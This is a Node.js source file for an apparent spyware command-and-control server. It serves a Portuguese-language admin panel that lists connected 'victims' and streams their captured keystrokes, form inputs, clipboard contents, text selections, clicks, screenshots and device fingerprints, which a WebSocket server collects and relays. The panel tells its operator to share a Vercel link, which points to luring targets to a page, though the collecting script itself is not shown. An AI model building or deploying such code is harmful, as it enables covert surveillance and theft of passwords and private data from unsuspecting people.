const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const sessions = {};
const adminClients = new Set();

// ---------- PAINEL ----------
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Æ Painel de Controle</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0b0d1a;
      color: #e0e5ff;
      font-family: 'Segoe UI', system-ui, sans-serif;
      display: flex;
      height: 100vh;
      overflow: hidden;
    }
    .sidebar {
      width: 280px;
      background: #13162b;
      border-right: 1px solid #2a2f55;
      display: flex;
      flex-direction: column;
      padding: 20px;
      flex-shrink: 0;
    }
    .sidebar h1 {
      font-size: 22px;
      font-weight: 700;
      background: linear-gradient(135deg, #00f0ff, #7b2ffc);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 10px;
    }
    .sidebar .status {
      font-size: 13px;
      color: #7b8ab8;
      margin-bottom: 25px;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .sidebar .status .dot {
      width: 8px;
      height: 8px;
      background: #00ff88;
      border-radius: 50%;
      animation: pulse 1.5s infinite;
    }
    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } }
    .sidebar .counter {
      background: #1c2142;
      padding: 12px 16px;
      border-radius: 12px;
      margin-bottom: 20px;
      border-left: 3px solid #00f0ff;
    }
    .sidebar .counter span { font-size: 28px; font-weight: 700; color: #fff; }
    .sidebar .counter small { color: #8892c0; font-size: 13px; display: block; }
    #victim-list {
      flex: 1;
      overflow-y: auto;
      list-style: none;
      margin-top: 5px;
    }
    #victim-list li {
      padding: 12px 14px;
      margin-bottom: 6px;
      background: #181d3a;
      border-radius: 10px;
      cursor: pointer;
      transition: 0.2s;
      border-left: 2px solid transparent;
      font-size: 14px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    #victim-list li:hover { background: #222a52; }
    #victim-list li.active { border-left-color: #00f0ff; background: #1f264a; }
    #victim-list li .badge {
      background: #2a3366;
      padding: 2px 10px;
      border-radius: 30px;
      font-size: 11px;
      color: #aab4e0;
    }
    .main {
      flex: 1;
      display: flex;
      flex-direction: column;
      padding: 25px 30px;
      background: #0b0d1a;
      overflow: hidden;
    }
    .main-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 10px;
      margin-bottom: 15px;
    }
    .main-header h2 {
      font-weight: 400;
      font-size: 20px;
      color: #bcc6f0;
    }
    .main-header h2 strong { color: #fff; font-weight: 600; }
    .main-header .actions {
      display: flex;
      gap: 10px;
      align-items: center;
    }
    .main-header .actions button {
      background: #1a1f3d;
      border: none;
      color: #aab4e0;
      padding: 6px 14px;
      border-radius: 30px;
      font-size: 13px;
      cursor: pointer;
      transition: 0.2s;
    }
    .main-header .actions button:hover {
      background: #2a2f55;
      color: #fff;
    }
    .main-header .actions .clear-btn {
      background: #3d1a2a;
      color: #ff7b9c;
    }
    .main-header .actions .clear-btn:hover {
      background: #5a1f3a;
    }
    .device-info {
      background: #0e1124;
      border-radius: 12px;
      padding: 10px 16px;
      margin-bottom: 15px;
      border: 1px solid #1e2346;
      font-size: 13px;
      color: #8892c0;
      display: flex;
      flex-wrap: wrap;
      gap: 12px 24px;
    }
    .device-info .item {
      display: flex;
      gap: 6px;
    }
    .device-info .item .label { color: #4a5580; }
    .device-info .item .value { color: #d0d9ff; }
    #log-container {
      flex: 1;
      background: #0e1124;
      border-radius: 16px;
      border: 1px solid #1e2346;
      padding: 15px 20px;
      overflow-y: auto;
      font-family: 'JetBrains Mono', monospace;
      font-size: 13px;
      line-height: 1.6;
    }
    #log-container .log-entry {
      padding: 4px 0;
      border-bottom: 1px solid #171d38;
      display: flex;
      gap: 12px;
      animation: fadeIn 0.2s ease;
    }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; } }
    .log-entry .time { color: #4a5580; white-space: nowrap; }
    .log-entry .type-tag {
      background: #2a2f55; padding: 0 10px; border-radius: 12px; font-size: 10px;
      text-transform: uppercase; color: #aab4e0; letter-spacing: 0.5px;
      white-space: nowrap;
    }
    .log-entry .content { color: #d0d9ff; word-break: break-all; }
    .log-entry .content img.screenshot-thumb {
      max-width: 200px;
      max-height: 150px;
      border-radius: 8px;
      border: 1px solid #2a2f55;
      cursor: pointer;
      margin-top: 4px;
      transition: 0.2s;
    }
    .log-entry .content img.screenshot-thumb:hover {
      transform: scale(1.02);
      border-color: #00f0ff;
    }
    .highlight-input { color: #ffd966; }
    .highlight-click { color: #ff7b9c; }
    .highlight-key { color: #6dd5ed; }
    .highlight-clip { color: #b38bff; }
    .highlight-handshake { color: #8be07a; }
    ::-webkit-scrollbar { width: 5px; }
    ::-webkit-scrollbar-track { background: #0b0d1a; }
    ::-webkit-scrollbar-thumb { background: #2a2f55; border-radius: 10px; }
    .empty-state { color: #3d4670; text-align: center; padding: 40px 0; font-size: 15px; }
    /* Lightbox para screenshot */
    .lightbox {
      display: none;
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0,0,0,0.9);
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
    .lightbox img {
      max-width: 90%;
      max-height: 90%;
      border-radius: 12px;
      border: 2px solid #2a2f55;
    }
    .lightbox.active { display: flex; }
    .lightbox .close-lb {
      position: absolute;
      top: 20px;
      right: 30px;
      font-size: 40px;
      color: #fff;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="lightbox" id="lightbox" onclick="this.classList.remove('active')">
    <span class="close-lb">&times;</span>
    <img id="lb-img" src="" alt="Screenshot">
  </div>

  <div class="sidebar">
    <h1>Æ CONTROL</h1>
    <div class="status"><span class="dot"></span> Sistema ativo</div>
    <div class="counter">
      <span id="total-count">0</span>
      <small>Vítimas conectadas</small>
    </div>
    <ul id="victim-list"></ul>
    <div style="margin-top: 12px; font-size: 11px; color: #2f3a66; text-align: center;">made by imrudra77</div>
  </div>
  <div class="main">
    <div class="main-header">
      <h2>📡 Monitorando: <strong id="selected-id">Nenhuma</strong></h2>
      <div class="actions">
        <span class="info-badge" id="event-counter">0 eventos</span>
        <button class="clear-btn" id="clear-logs">🗑️ Limpar logs</button>
      </div>
    </div>
    <div id="device-info" class="device-info" style="display:none;"></div>
    <div id="log-container">
      <div class="empty-state">Aguardando conexões... <br> Compartilhe seu link do Vercel.</div>
    </div>
  </div>

  <script>
    const WS_URL = \`wss://\${window.location.host}\`;
    let ws;
    let allData = {};
    let selectedId = null;

    function connect() {
      ws = new WebSocket(WS_URL);
      ws.onopen = () => {
        ws.send(JSON.stringify({ type: 'admin' }));
        console.log('[+] Painel conectado');
      };
      ws.onmessage = (e) => {
        const msg = JSON.parse(e.data);
        if (msg.type === 'update') {
          if (!allData[msg.sess]) allData[msg.sess] = [];
          allData[msg.sess].push(msg);
          renderSidebar();
          if (selectedId === msg.sess) renderLogs(selectedId);
        } else if (msg.type === 'init') {
          allData = msg.data || {};
          renderSidebar();
          if (Object.keys(allData).length > 0) {
            selectVictim(Object.keys(allData)[0]);
          }
        }
      };
      ws.onclose = () => setTimeout(connect, 2000);
    }

    function renderSidebar() {
      const ids = Object.keys(allData);
      document.getElementById('total-count').textContent = ids.length;
      const list = document.getElementById('victim-list');
      list.innerHTML = '';
      ids.forEach(id => {
        const li = document.createElement('li');
        li.className = (selectedId === id) ? 'active' : '';
        const count = allData[id].length;
        li.innerHTML = \`\${id.slice(0, 8)}... <span class="badge">\${count} logs</span>\`;
        li.onclick = () => selectVictim(id);
        list.appendChild(li);
      });
    }

    function selectVictim(id) {
      selectedId = id;
      document.getElementById('selected-id').textContent = id;
      renderSidebar();
      renderLogs(id);
      renderDeviceInfo(id);
    }

    function renderDeviceInfo(id) {
      const logs = allData[id] || [];
      const handshake = logs.find(l => l.type === 'handshake');
      const div = document.getElementById('device-info');
      if (handshake && handshake.device) {
        const d = handshake.device;
        div.style.display = 'flex';
        div.innerHTML = \`
          <span class="item"><span class="label">Plataforma:</span> <span class="value">\${d.platform || '?'}</span></span>
          <span class="item"><span class="label">Idioma:</span> <span class="value">\${d.language || '?'}</span></span>
          <span class="item"><span class="label">Tela:</span> <span class="value">\${d.screen || '?'}</span></span>
          <span class="item"><span class="label">RAM:</span> <span class="value">\${d.deviceMemory || '?'} GB</span></span>
          <span class="item"><span class="label">Núcleos:</span> <span class="value">\${d.cores || '?'}</span></span>
          <span class="item"><span class="label">Touch:</span> <span class="value">\${d.touch ? 'Sim' : 'Não'}</span></span>
          <span class="item"><span class="label">Cookies:</span> <span class="value">\${d.cookies ? 'Ativados' : 'Desativados'}</span></span>
          <span class="item" style="flex:1; min-width:200px;"><span class="label">User-Agent:</span> <span class="value" style="font-size:11px; word-break:break-all;">\${d.ua || '?'}</span></span>
        \`;
      } else {
        div.style.display = 'none';
      }
    }

    function renderLogs(id) {
      const container = document.getElementById('log-container');
      const logs = allData[id] || [];
      document.getElementById('event-counter').textContent = logs.length + ' eventos';
      if (logs.length === 0) {
        container.innerHTML = '<div class="empty-state">Nenhum dado capturado ainda para esta vítima.</div>';
        return;
      }
      let html = '';
      logs.forEach((log, index) => {
        const time = log.timestamp ? new Date(log.timestamp).toLocaleTimeString('pt-BR') : '—';
        let content = '';
        let typeClass = '';
        const type = log.type || 'unknown';

        if (type === 'handshake') {
          content = \`Nova conexão: \${log.url || 'desconhecida'}\`;
          typeClass = 'highlight-handshake';
        } else if (type === 'input') {
          content = \`[\${log.name || 'campo'}] = "\${(log.value || '').slice(0, 100)}"\`;
          typeClass = 'highlight-input';
        } else if (type === 'click') {
          content = \`(\${log.x || 0}, \${log.y || 0}) em \${log.target || 'elemento'}\`;
          typeClass = 'highlight-click';
        } else if (type === 'keydown') {
          content = \`Tecla: "\${log.key || ''}"\`;
          if (log.ctrl) content += ' (Ctrl)';
          if (log.shift) content += ' (Shift)';
          typeClass = 'highlight-key';
        } else if (type === 'clipboard') {
          content = \`Copiou: "\${(log.content || '').slice(0, 80)}"\`;
          typeClass = 'highlight-clip';
        } else if (type === 'selection') {
          content = \`Selecionou: "\${(log.text || '').slice(0, 80)}"\`;
          typeClass = 'highlight-clip';
        } else if (type === 'screenshot') {
          if (log.image) {
            content = \`<img src="\${log.image}" class="screenshot-thumb" onclick="event.stopPropagation(); document.getElementById('lb-img').src=this.src; document.getElementById('lightbox').classList.add('active');" />\`;
          } else {
            content = \`Captura de tela (\${log.title || 'página'}) - imagem não disponível\`;
          }
          typeClass = '';
        } else {
          content = JSON.stringify(log).slice(0, 120);
        }

        html += \`<div class="log-entry">
          <span class="time">\${time}</span>
          <span class="type-tag">\${type}</span>
          <span class="content \${typeClass}">\${content}</span>
        </div>\`;
      });
      container.innerHTML = html;
      container.scrollTop = container.scrollHeight;
    }

    // Botão limpar logs da vítima selecionada
    document.getElementById('clear-logs').addEventListener('click', function() {
      if (!selectedId) return;
      if (!confirm('Limpar todos os logs de ' + selectedId + '?')) return;
      if (allData[selectedId]) {
        allData[selectedId] = [];
        renderSidebar();
        renderLogs(selectedId);
        // Envia comando para o servidor? Não é necessário, mas podemos enviar uma mensagem para limpar no servidor também.
        ws.send(JSON.stringify({ type: 'clear', sess: selectedId }));
      }
    });

    connect();
  </script>
</body>
</html>
  `);
});

// ---------- WEBSOCKET ----------
wss.on('connection', (ws) => {
  ws.isAdmin = false;

  ws.on('message', (msg) => {
    try {
      const data = JSON.parse(msg);
      
      if (data.type === 'admin') {
        ws.isAdmin = true;
        adminClients.add(ws);
        ws.send(JSON.stringify({ type: 'init', data: sessions }));
        return;
      }

      // Comando para limpar logs de uma sessão
      if (data.type === 'clear' && data.sess) {
        if (sessions[data.sess]) {
          sessions[data.sess] = [];
          // Notifica administradores
          adminClients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
              client.send(JSON.stringify({ type: 'clear_ack', sess: data.sess }));
            }
          });
        }
        return;
      }

      // Dados de vítima
      if (data.sess) {
        if (!sessions[data.sess]) sessions[data.sess] = [];
        sessions[data.sess].push(data);
        
        adminClients.forEach(client => {
          if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({ type: 'update', sess: data.sess, ...data }));
          }
        });
      }
    } catch (e) {}
  });

  ws.on('close', () => {
    if (ws.isAdmin) adminClients.delete(ws);
  });
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log(`Æ Bot Painel rodando na porta ${PORT}`);
});
